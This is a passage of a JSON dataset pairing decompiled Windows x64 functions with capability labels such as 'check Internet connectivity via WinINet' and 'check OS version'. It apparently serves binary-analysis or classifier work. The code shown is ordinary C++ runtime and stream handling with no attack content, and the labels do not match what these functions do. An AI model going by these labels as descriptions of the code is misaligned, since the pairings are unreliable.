arg1;\n        }\n        piVar3 = arg1[0xf];\n        if (piVar3 < 0x3ffffffffffffffd) {\n            *(puVar5 + -0xd8) = 0x14008bfb3;\n            iVar4 = fcn.1400bc6e0(piVar3 * 2);\n            *(arg1 + 0x10) = 1;\n            arg1[0xe] = iVar4;\n            goto code_r0x00014008bf09;\n        }\n        *(puVar5 + -0xd8) = 0x14008bfc8;\n        fcn.1400bd850();\n        in_RDX = *in_RDX;\n        puVar5 = puVar5 + -0xd0;\n    }\n    *(piVar3 + 0xc) = arg3;\n    piVar3[3] = iVar4;\n    piVar3[1] = iVar4;\n    piVar3[2] = iVar4;\n    *(piVar3 + 4) = 0x0;\n    *(piVar3 + 0x81) = 0;\n    piVar3[6] = 0;\n    piVar3[0xd] = CONCAT44(*(piVar3 + 100), *(piVar3 + 100));\n    if ((in_R8 & 2) == 0) {\n        return piVar3;\n    }\n    iVar4 = *piVar3;\n    *(puVar5 + -0x48) = arg3;\n    pcVar1 = *(iVar4 + 0x20);\n    *(puVar5 + -0x70) = 0x14008be5b;\n    (*pcVar1)(puVar5 + -0x38, piVar3, 0, 2);\n    if (*(puVar5 + -0x38) == -1) {\n        *(puVar5 + -0x70) = 0x14008be6b;\n        fcn.14008c240(piVar3);\n        return NULL;\n    }\n    return piVar3;\n}\n",
        "token_count": 1730
    },
    "14008bd9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.14008bd90(int64_t *arg1, ulong *arg2, uint64_t arg3)\n\n{\n    int64_t *arg1_00;\n    code *pcVar1;\n    char cVar2;\n    int64_t iVar3;\n    int64_t *unaff_RBX;\n    uint64_t unaff_RBP;\n    uint64_t arg3_00;\n    ulong *unaff_RSI;\n    int64_t *unaff_RDI;\n    uint64_t uVar4;\n    \n    while( true ) {\n        *(*0x20 + -8) = unaff_RBP;\n        *(*0x20 + -0x10) = unaff_RDI;\n        *(*0x20 + -0x18) = unaff_RSI;\n        *(*0x20 + -0x20) = unaff_RBX;\n        arg1_00 = arg1 + 10;\n        arg3_00 = arg3 & 0xffffffff;\n        *(*0x20 + -0x70) = 0x14008bdad;\n        cVar2 = fcn.140027090(arg1_00);\n        if (cVar2 != '\\0') {\n            return NULL;\n        }\n        *(*0x20 + -0x70) = 0x14008bdc9;\n        unaff_RSI = arg2;\n        uVar4 = arg3_00;\n        fcn.140081ef0(arg1_00, arg2, arg3_00);\n        *(*0x20 + -0x70) = 0x14008bdd1;\n        cVar2 = fcn.140027090(arg1_00);\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        iVar3 = arg1[0xe];\n        if ((*(arg1 + 0x10) != '\\0') || (iVar3 != 0)) break;\n        unaff_RBX = arg1[0xf];\n        if (unaff_RBX < 0x3ffffffffffffffd) {\n            *(*0x20 + -0x70) = 0x14008be93;\n            iVar3 = fcn.1400bc6e0(unaff_RBX * 2);\n            *(arg1 + 0x10) = 1;\n            arg1[0xe] = iVar3;\n            break;\n        }\n        *(*0x20 + -0x70) = 0x14008bea8;\n        fcn.1400bd850();\n        *(*0x20 + -0x70) = arg3_00;\n        *(*0x20 + -0x78) = arg1_00;\n        *(*0x20 + -0x80) = arg2;\n        *(*0x20 + -0x88) = arg1;\n        unaff_RDI = unaff_RBX + 10;\n        unaff_RBP = uVar4 & 0xffffffff;\n        *(*0x20 + -0xd8) = 0x14008becd;\n        cVar2 = fcn.140027090(unaff_RDI);\n        if (cVar2 != '\\0') {\n            return NULL;\n        }\n        *(*0x20 + -0xd8) = 0x14008bee3;\n        arg2 = unaff_RSI;\n        arg3 = unaff_RBP;\n        fcn.140081f40(unaff_RDI, unaff_RSI, unaff_RBP);\n        *(*0x20 + -0xd8) = 0x14008beeb;\n        cVar2 = fcn.140027090(unaff_RDI);\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        iVar3 = unaff_RBX[0xe];\n        if ((*(unaff_RBX + 0x10) != '\\0') || (iVar3 != 0)) {\ncode_r0x00014008bf09:\n            *(unaff_RBX + 0xc) = unaff_RBP;\n            unaff_RBX[3] = iVar3;\n            unaff_RBX[1] = iVar3;\n            unaff_RBX[2] = iVar3;\n            *(unaff_RBX + 4) = 0x0;\n            *(unaff_RBX + 0x81) = 0;\n            unaff_RBX[6] = 0;\n            unaff_RBX[0xd] = CONCAT44(*(unaff_RBX + 100), *(unaff_RBX + 100));\n            if ((uVar4 & 2) == 0) {\n                return unaff_RBX;\n            }\n            iVar3 = *unaff_RBX;\n            *(*0x20 + -0xb0) = unaff_RBP;\n            pcVar1 = *(iVar3 + 0x20);\n            *(*0x20 + -0xd8) = 0x14008bf7b;\n            (*pcVar1)(*0x20 + -0xa0, unaff_RBX, 0, 2);\n            if (*(*0x20 + -0xa0) == -1) {\n                *(*0x20 + -0xd8) = 0x14008bf8b;\n                fcn.14008c240(unaff_RBX);\n                return NULL;\n            }\n            return unaff_RBX;\n        }\n        arg1 = unaff_RBX[0xf];\n        if (arg1 < 0x3ffffffffffffffd) {\n            *(*0x20 + -0xd8) = 0x14008bfb3;\n            iVar3 = fcn.1400bc6e0(arg1 * 2);\n            *(unaff_RBX + 0x10) = 1;\n            unaff_RBX[0xe] = iVar3;\n            goto code_r0x00014008bf09;\n        }\n        *(*0x20 + -0xd8) = 0x14008bfc8;\n        fcn.1400bd850();\n        arg2 = *arg2;\n        *0x20 = *0x20 + -0xd0;\n    }\n    *(arg1 + 0xc) = arg3_00;\n    arg1[3] = iVar3;\n    arg1[1] = iVar3;\n    arg1[2] = iVar3;\n    *(arg1 + 4) = 0x0;\n    *(arg1 + 0x81) = 0;\n    arg1[6] = 0;\n    arg1[0xd] = CONCAT44(*(arg1 + 100), *(arg1 + 100));\n    if ((arg3 & 2) == 0) {\n        return arg1;\n    }\n    iVar3 = *arg1;\n    *(*0x20 + -0x48) = arg3_00;\n    pcVar1 = *(iVar3 + 0x20);\n    *(*0x20 + -0x70) = 0x14008be5b;\n    (*pcVar1)(*0x20 + -0x38, arg1, 0, 2);\n    if (*(*0x20 + -0x38) == -1) {\n        *(*0x20 + -0x70) = 0x14008be6b;\n        fcn.14008c240(arg1);\n        return NULL;\n    }\n    return arg1;\n}\n",
        "token_count": 1600
    },
    "14008beb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.14008beb0(int64_t *arg1, ulong *arg2, uint64_t arg3)\n\n{\n    int64_t *arg1_00;\n    code *pcVar1;\n    char cVar2;\n    int64_t iVar3;\n    ulong *puVar4;\n    int64_t *unaff_RBX;\n    uint64_t unaff_RBP;\n    uint64_t arg3_00;\n    ulong *unaff_RSI;\n    int64_t *unaff_RDI;\n    uint64_t uVar5;\n    \n    while( true ) {\n        *(*0x20 + -8) = unaff_RBP;\n        *(*0x20 + -0x10) = unaff_RDI;\n        *(*0x20 + -0x18) = unaff_RSI;\n        *(*0x20 + -0x20) = unaff_RBX;\n        arg1_00 = arg1 + 10;\n        arg3_00 = arg3 & 0xffffffff;\n        *(*0x20 + -0x70) = 0x14008becd;\n        cVar2 = fcn.140027090(arg1_00);\n        if (cVar2 != '\\0') {\n            return NULL;\n        }\n        *(*0x20 + -0x70) = 0x14008bee3;\n        puVar4 = arg2;\n        uVar5 = arg3_00;\n        fcn.140081f40(arg1_00, arg2, arg3_00);\n        *(*0x20 + -0x70) = 0x14008beeb;\n        cVar2 = fcn.140027090(arg1_00);\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        iVar3 = arg1[0xe];\n        if ((*(arg1 + 0x10) != '\\0') || (iVar3 != 0)) break;\n        unaff_RBX = arg1[0xf];\n        if (unaff_RBX < 0x3ffffffffffffffd) {\n            *(*0x20 + -0x70) = 0x14008bfb3;\n            iVar3 = fcn.1400bc6e0(unaff_RBX * 2);\n            *(arg1 + 0x10) = 1;\n            arg1[0xe] = iVar3;\n            break;\n        }\n        *(*0x20 + -0x70) = 0x14008bfc8;\n        fcn.1400bd850();\n        unaff_RSI = *puVar4;\n        *(*0x20 + -0x70) = arg3_00;\n        *(*0x20 + -0x78) = arg1_00;\n        *(*0x20 + -0x80) = arg2;\n        *(*0x20 + -0x88) = arg1;\n        unaff_RDI = unaff_RBX + 10;\n        unaff_RBP = uVar5 & 0xffffffff;\n        *(*0x20 + -0xd8) = 0x14008bdad;\n        cVar2 = fcn.140027090(unaff_RDI);\n        if (cVar2 != '\\0') {\n            return NULL;\n        }\n        *(*0x20 + -0xd8) = 0x14008bdc9;\n        arg2 = unaff_RSI;\n        arg3 = unaff_RBP;\n        fcn.140081ef0(unaff_RDI, unaff_RSI, unaff_RBP);\n        *(*0x20 + -0xd8) = 0x14008bdd1;\n        cVar2 = fcn.140027090(unaff_RDI);\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        iVar3 = unaff_RBX[0xe];\n        if ((*(unaff_RBX + 0x10) != '\\0') || (iVar3 != 0)) {\ncode_r0x00014008bdef:\n            *(unaff_RBX + 0xc) = unaff_RBP;\n            unaff_RBX[3] = iVar3;\n            unaff_RBX[1] = iVar3;\n            unaff_RBX[2] = iVar3;\n            *(unaff_RBX + 4) = 0x0;\n            *(unaff_RBX + 0x81) = 0;\n            unaff_RBX[6] = 0;\n            unaff_RBX[0xd] = CONCAT44(*(unaff_RBX + 100), *(unaff_RBX + 100));\n            if ((uVar5 & 2) == 0) {\n                return unaff_RBX;\n            }\n            iVar3 = *unaff_RBX;\n            *(*0x20 + -0xb0) = unaff_RBP;\n            pcVar1 = *(iVar3 + 0x20);\n            *(*0x20 + -0xd8) = 0x14008be5b;\n            (*pcVar1)(*0x20 + -0xa0, unaff_RBX, 0, 2);\n            if (*(*0x20 + -0xa0) == -1) {\n                *(*0x20 + -0xd8) = 0x14008be6b;\n                fcn.14008c240(unaff_RBX);\n                return NULL;\n            }\n            return unaff_RBX;\n        }\n        arg1 = unaff_RBX[0xf];\n        if (arg1 < 0x3ffffffffffffffd) {\n            *(*0x20 + -0xd8) = 0x14008be93;\n            iVar3 = fcn.1400bc6e0(arg1 * 2);\n            *(unaff_RBX + 0x10) = 1;\n            unaff_RBX[0xe] = iVar3;\n            goto code_r0x00014008bdef;\n        }\n        *(*0x20 + -0xd8) = 0x14008bea8;\n        fcn.1400bd850();\n        *0x20 = *0x20 + -0xd0;\n    }\n    *(arg1 + 0xc) = arg3_00;\n    arg1[3] = iVar3;\n    arg1[1] = iVar3;\n    arg1[2] = iVar3;\n    *(arg1 + 4) = 0x0;\n    *(arg1 + 0x81) = 0;\n    arg1[6] = 0;\n    arg1[0xd] = CONCAT44(*(arg1 + 100), *(arg1 + 100));\n    if ((arg3 & 2) == 0) {\n        return arg1;\n    }\n    iVar3 = *arg1;\n    *(*0x20 + -0x48) = arg3_00;\n    pcVar1 = *(iVar3 + 0x20);\n    *(*0x20 + -0x70) = 0x14008bf7b;\n    (*pcVar1)(*0x20 + -0x38, arg1, 0, 2);\n    if (*(*0x20 + -0x38) == -1) {\n        *(*0x20 + -0x70) = 0x14008bf8b;\n        fcn.14008c240(arg1);\n        return NULL;\n    }\n    return arg1;\n}\n",
        "token_count": 1609
    },
    "14008c24": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.14008c240(int64_t arg1)\n\n{\n    ulong uVar1;\n    char cVar2;\n    int64_t iVar3;\n    \n    cVar2 = fcn.140027090(arg1 + 0x50);\n    if (cVar2 != '\\0') {\n        cVar2 = fcn.14008ba30(arg1);\n        *(arg1 + 0x60) = 0;\n        *(arg1 + 0x98) = 0;\n        if (*(arg1 + 0x80) != '\\0') {\n            if (*(arg1 + 0x70) != 0) {\n                fcn.1400bc6b0();\n            }\n            *(arg1 + 0x70) = 0;\n            *(arg1 + 0x80) = 0;\n        }\n        if (*(arg1 + 0xa8) != 0) {\n            fcn.1400bc6b0();\n        }\n        uVar1 = *(arg1 + 0x70);\n        *(arg1 + 0xa8) = 0;\n        *(arg1 + 0x18) = uVar1;\n        *(arg1 + 0xb0) = 0;\n        *(arg1 + 0x81) = 0;\n        *(arg1 + 0x30) = 0;\n        *(arg1 + 0xb8) = 0x0;\n        *(arg1 + 0x20) = 0x0;\n        *(arg1 + 8) = uVar1;\n        *(arg1 + 0x10) = uVar1;\n        *(arg1 + 0x68) = CONCAT44(*(arg1 + 100), *(arg1 + 100));\n        iVar3 = fcn.140082010(arg1 + 0x50);\n        if ((iVar3 != 0) && (cVar2 == '\\x01')) {\n            return arg1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 440
    },
    "1400b548": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar * fcn.1400b5480(int64_t arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    char *in_RAX;\n    char *arg1_00;\n    uint64_t arg2_00;\n    ulong in_R8;\n    uchar auStack88 [8];\n    \n    if (*(arg1 + 0xe8) == 0) {\n        arg2._0_4_ = arg2 | 1;\n    }\n    *(arg1 + 0x20) = arg2;\n    arg2._0_4_ = arg2 & *(arg1 + 0x1c);\n    arg2_00 = arg2;\n    if (arg2 == 0) {\n        return in_RAX;\n    }\n    arg1_00 = \"basic_ios::clear\";\n    fcn.1400bd8d0(\"basic_ios::clear\");\n    fcn.1400a59d0(arg1_00, arg2_00 + 0xd0);\n    fcn.1400b3230(auStack88, arg2_00, in_R8);\n    fcn.1400a5ae0(auStack88);\n    fcn.1400b51a0(arg2_00, in_R8);\n    piVar1 = *(arg2_00 + 0xe8);\n    if (piVar1 != NULL) {\n        fcn.1400a59d0(auStack88, piVar1 + 7);\n        (**(*piVar1 + 0x10))(piVar1, in_R8);\n        fcn.1400a5b40(piVar1 + 7, in_R8);\n        fcn.1400a5ae0(auStack88);\n    }\n    return arg1_00;\n}\n",
        "token_count": 390
    },
    "14009273": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.140092730(uchar *arg1, int64_t **arg2, uchar *arg3)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    char cVar5;\n    int16_t iVar6;\n    uint16_t uVar7;\n    ulong uVar8;\n    int64_t iVar9;\n    int64_t *piVar10;\n    int64_t *piVar11;\n    int16_t *piVar12;\n    char *arg1_00;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    int64_t **ppiVar15;\n    int64_t *piVar16;\n    int16_t *piVar17;\n    uint64_t arg2_00;\n    uchar *unaff_RBX;\n    uchar *puVar18;\n    int64_t *unaff_RBP;\n    uchar *unaff_RSI;\n    int64_t *unaff_RDI;\n    uchar *puVar19;\n    uchar *puVar20;\n    int16_t in_R9W;\n    int16_t *piVar21;\n    ulong unaff_R12;\n    int64_t *piVar22;\n    ulong unaff_R13;\n    ulong unaff_R14;\n    int16_t *piVar23;\n    uchar *puVar24;\n    ulong unaff_R15;\n    char acStack273 [73];\n    uchar auStack200 [32];\n    int64_t *piStack168;\n    uchar *puStack160;\n    int64_t *piStack152;\n    uchar auStack144 [40];\n    uchar *puStack104;\n    uchar *puStack96;\n    int64_t *piStack88;\n    int64_t *piStack80;\n    uchar auStack72 [40];\n    \n    piVar22 = *arg2;\n    *arg1 = 0;\n    cVar5 = arg3;\n    iVar9 = piVar22[-3] + arg2;\n    uVar14 = *(iVar9 + 0x20);\n    if (uVar14 != 0) goto code_r0x0001400b5480;\n    piVar22 = *(iVar9 + 0xd8);\n    if (piVar22 == NULL) {\n        if ((cVar5 != '\\0') || ((*(iVar9 + 0x19) & 0x10) == 0)) {\ncode_r0x0001400927a3:\n            *arg1 = 1;\n            return piVar22;\n        }\n    }\n    else {\n        piStack80 = 0x140092769;\n        fcn.140093c60(piVar22);\n        piVar22 = *arg2;\n        iVar9 = piVar22[-3] + arg2;\n        if ((cVar5 != '\\0') || ((*(iVar9 + 0x19) & 0x10) == 0)) {\ncode_r0x00014009277e:\n            uVar14 = *(iVar9 + 0x20);\n            if (uVar14 == 0) goto code_r0x0001400927a3;\n            goto code_r0x0001400b5480;\n        }\n    }\n    piVar1 = *(iVar9 + 0xe8);\n    piVar22 = piVar1[2];\n    if (piVar22 < piVar1[3]) {\n        uVar7 = *piVar22;\n    }\n    else {\n        piStack80 = 0x1400928a8;\n        uVar7 = (**(*piVar1 + 0x48))(piVar1);\n        piVar22 = *arg2;\n        iVar9 = piVar22[-3] + arg2;\n    }\n    arg3 = uVar7;\n    piVar11 = *(iVar9 + 0xf0);\n    if (piVar11 != NULL) {\n        if (uVar7 != 0xffff) {\n            do {\n                piStack80 = 0x14009281d;\n                cVar5 = (**(*piVar11 + 0x10))(piVar11);\n                if (cVar5 == '\\0') {\n                    piVar22 = *arg2;\n                    iVar9 = arg2 + piVar22[-3];\n                    goto code_r0x00014009277e;\n                }\n                piVar21 = piVar1[2];\n                if (piVar21 < piVar1[3]) {\n                    iVar6 = *piVar21;\n                    piVar1[2] = piVar21 + 1;\n                }\n                else {\n                    piStack80 = 0x140092834;\n                    iVar6 = (**(*piVar1 + 0x50))(piVar1);\n                }\n                if (iVar6 == -1) break;\n                if (piVar1[2] < piVar1[3]) {\n                    uVar7 = *piVar1[2];\n                }\n                else {\n                    piStack80 = 0x140092861;\n                    uVar7 = (**(*piVar1 + 0x48))(piVar1);\n                }\n                arg3 = uVar7;\n            } while (uVar7 != 0xffff);\n            piVar22 = *arg2;\n            iVar9 = arg2 + piVar22[-3];\n        }\n        uVar14 = *(iVar9 + 0x20) | 2;\n        goto code_r0x0001400b5480;\n    }\n    piStack80 = 0x1400928c0;\n    fcn.1400bd1f0();\n    piStack80 = 0x1400928c5;\n    fcn.1400bc860(iVar9);\n    ppiVar15 = 0x1;\n    piStack80 = 0x1400928d9;\n    fcn.1400b5180(arg2 + (*arg2)[-3], 1);\n    piStack80 = 0x1400928de;\n    uVar8 = fcn.1400bcd60();\n    piStack80 = 0x1400928e6;\n    fcn.1400bca40();\n    piStack80 = 0x1400928ee;\n    puStack104 = fcn.140014f30(uVar8);\n    piStack80 = 0x1400928f6;\n    fcn.1400bca40();\n    piStack80 = 0x1400928fe;\n    puStack160 = puStack104;\n    fcn.140014f30(puStack104);\n    piStack80 = piVar11;\n    piStack88 = piVar1;\n    puStack96 = arg1;\n    piVar22 = *ppiVar15;\n    *puStack160 = 0;\n    cVar5 = arg3;\n    iVar9 = piVar22[-3] + ppiVar15;\n    uVar14 = *(iVar9 + 0x20);\n    if (uVar14 == 0) {\n        piVar22 = *(iVar9 + 0xd8);\n        if (piVar22 == NULL) {\n            if ((cVar5 != '\\0') || ((*(iVar9 + 0x19) & 0x10) == 0)) {\ncode_r0x000140092973:\n                *puStack160 = 1;\n                return piVar22;\n            }\n        }\n        else {\n            piStack152 = 0x140092939;\n            fcn.140093c60(piVar22);\n            piVar22 = *ppiVar15;\n            iVar9 = piVar22[-3] + ppiVar15;\n            if ((cVar5 != '\\0') || ((*(iVar9 + 0x19) & 0x10) == 0)) {\ncode_r0x00014009294e:\n                uVar14 = *(iVar9 + 0x20);\n                if (uVar14 == 0) goto code_r0x000140092973;\n                goto code_r0x000140092955;\n            }\n        }\n        piVar1 = *(iVar9 + 0xe8);\n        piVar22 = piVar1[2];\n        if (piVar22 < piVar1[3]) {\n            uVar7 = *piVar22;\n        }\n        else {\n            piStack152 = 0x140092a78;\n            uVar7 = (**(*piVar1 + 0x48))(piVar1);\n            piVar22 = *ppiVar15;\n            iVar9 = piVar22[-3] + ppiVar15;\n        }\n        arg3 = uVar7;\n        piVar11 = *(iVar9 + 0xf0);\n        if (piVar11 == NULL) {\n            piStack152 = 0x140092a90;\n            fcn.1400bd1f0();\n            piStack152 = 0x140092a95;\n            fcn.1400bc860(iVar9);\n            piVar16 = 0x1;\n            piStack152 = 0x140092aa9;\n            fcn.1400b5180(ppiVar15 + (*ppiVar15)[-3], 1);\n            piStack152 = 0x140092aae;\n            uVar8 = fcn.1400bcd60();\n            piStack152 = 0x140092ab6;\n            fcn.1400bca40();\n            piStack152 = 0x140092abe;\n            piStack168 = fcn.140014f30(uVar8);\n            piStack152 = 0x140092ac6;\n            fcn.1400bca40();\n            piStack152 = 0x140092ace;\n            piVar10 = piStack168;\n            fcn.140014f30(piStack168);\n            puVar18 = &stack0xffffffffffffff38;\n            piVar11 = *(piVar10 + *(*piVar10 + -0x18) + 0xf0);\n            piVar22 = piVar16;\n            puVar19 = arg3;\n            piStack152 = piVar1;\n            if (piVar11 == NULL) {\n                fcn.1400bd1f0();\n            }\n            else {\n                in_R9W = (**(*piVar11 + 0x50))(piVar11, 10);\n                piVar11 = piVar10;\n                piVar10 = piStack168;\n                puVar18 = &stack0xffffffffffffff70;\n                arg3 = puStack160;\n                piVar16 = piStack152;\n            }\n            *(puVar18 + -8) = unaff_R15;\n            *(puVar18 + -0x10) = unaff_R14;\n            *(puVar18 + -0x18) = unaff_R13;\n            *(puVar18 + -0x20) = unaff_R12;\n            *(puVar18 + -0x28) = 0;\n            *(puVar18 + -0x30) = piVar16;\n            *(puVar18 + -0x38) = arg3;\n            *(puVar18 + -0x40) = piVar10;\n            piVar11[1] = 0;\n            *(puVar18 + -0x80) = 0x140092b5a;\n            fcn.140092730(puVar18 + -0x49, piVar11, 0x1);\n            if (puVar18[-0x49] == '\\0') {\ncode_r0x000140092b61:\n                puVar20 = piVar11[1];\n                if (0 < puVar19) {\n                    *piVar22 = 0;\n                }\njoined_r0x000140092cb2:\n                if (puVar20 != NULL) {\n                    return piVar11;\n                }\ncode_r0x000140092b76:\n                uVar14 = 4;\n            }\n            else {\n                piVar1 = *(piVar11 + *(*piVar11 + -0x18) + 0xe8);\n                if (piVar1[2] < piVar1[3]) {\n                    iVar6 = *piVar1[2];\n                }\n                else {\n                    pcVar2 = *(*piVar1 + 0x48);\n                    *(puVar18 + -0x80) = 0x140092dc0;\n                    iVar6 = (*pcVar2)();\n                }\n                puVar24 = piVar11[1];\n                puVar20 = puVar24 + 1;\n                if (puVar20 < puVar19) {\n                    piVar10 = piVar22;\n                    if (iVar6 != -1) {\n                        do {\n                            piVar22 = piVar10;\n                            if (iVar6 == in_R9W) goto code_r0x000140092c89;\n                            piVar21 = piVar1[3];\n                            piVar12 = piVar1[2];\n                            piVar23 = piVar21 - piVar12 >> 1;\n                            if (puVar19 + (-1 - puVar24) <= piVar23) {\n                                piVar23 = puVar19 + (-1 - puVar24);\n                            }\n                            piVar3 = piVar12;\n                            piVar17 = piVar23;\n                            piVar4 = piVar12;\n                            if (piVar23 < 2) {\n                                *piVar10 = iVar6;\n                                piVar22 = piVar10 + 2;\n                                piVar11[1] = puVar20;\n                                if (piVar12 < piVar21) {\n                                    iVar6 = *piVar12;\n                                    piVar1[2] = piVar12 + 1;\n                                }\n                                else {\n                                    pcVar2 = *(*piVar1 + 0x50);\n                                    *(puVar18 + -0x80) = 0x140092d9b;\n                                    iVar6 = (*pcVar2)();\n                                }\n                                if (iVar6 == -1) {\n                                    puVar24 = piVar11[1];\n                                    goto code_r0x000140092d6e;\n                                }\n                                if (piVar1[2] < piVar1[3]) {\n                                    iVar6 = *piVar1[2];\n                                    puVar24 = piVar11[1];\n                                }\n                                else {\n                                    pcVar2 = *(*piVar1 + 0x48);\n                                    *(puVar18 + -0x80) = 0x140092da9;\n                                    iVar6 = (*pcVar2)();\n                                    puVar24 = piVar11[1];\n                                }\n                            }\n                            else {\n                                while (piVar4 != NULL) {\n                                    if (*piVar3 == in_R9W) {\n                                        piVar23 = piVar3 - piVar12 >> 1;\n                                        if (piVar23 == NULL) goto code_r0x000140092c51;\n                                        break;\n                                    }\n                                    piVar17 = piVar17 + -1;\n                                    piVar3 = piVar3 + 1;\n                                    piVar4 = piVar17;\n                                }\n                                iVar9 = piVar23 * 2;\n                                piVar22 = piVar10 + iVar9;\n                                *(puVar18 + -0x80) = 0x140092cd5;\n                                sub.msvcrt.dll_memcpy(piVar10, piVar12, iVar9);\n                                piVar21 = piVar1[3];\n                                piVar12 = piVar1[2] + iVar9;\ncode_r0x000140092c51:\n     